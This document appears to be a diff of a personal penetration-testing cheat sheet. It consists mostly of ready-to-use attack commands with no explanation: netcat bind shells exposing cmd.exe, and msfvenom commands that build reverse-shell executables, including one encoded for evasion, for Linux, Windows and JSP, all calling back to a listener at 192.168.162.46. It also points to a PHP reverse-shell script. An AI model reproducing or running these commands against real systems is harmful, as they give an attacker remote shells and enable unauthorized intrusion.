@@ -1,5 +1,5 @@
 =================================== 
-Reverse Ports: 80, 443, 53 
+Reverse Ports: 80, 443, 53, 21
 
 =================================== 
 Bind
@@ -7,8 +7,12 @@ nc -nlvp 443 -e cmd.exe    ..Windows: Share cmd (to anyone)
 nc -nv 192.168.200.5 443      ..Linux: Connect to remote cmd
 
 =================================== 
-msfvenom -p linux/x64/shell/reverse_tcp LHOST=192.168.162.46 LPORT=4443 -f elf > shell
+Favorites
+
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.162.46 LPORT=4443 -f elf > shell
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.162.46 LPORT=443 -f exe > shell.exe
+
+=================================== 
 msfvenom -p windows/shell/reverse_tcp LHOST=192.168.162.46 LPORT=443 -f exe > shell.exe
 msfvenom -p windows/shell_reverse_tcp LHOST=192.168.162.46 LPORT=443 -e x86/shikata_ga_nai -f exe -o shellenc.exe
 msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.162.46 LPORT=443 -f raw > venomshell.jsp 
@@ -22,7 +26,7 @@ linux/x64/shell/reverse_tcp          ..staged
 
 =================================== 
 php
-/home/boss/tools/privesc_windows/windows-php-reverse-shell.php
+~/tools/privesc_windows/windows-php-reverse-shell.php
 
 =================================== 
 Reverse
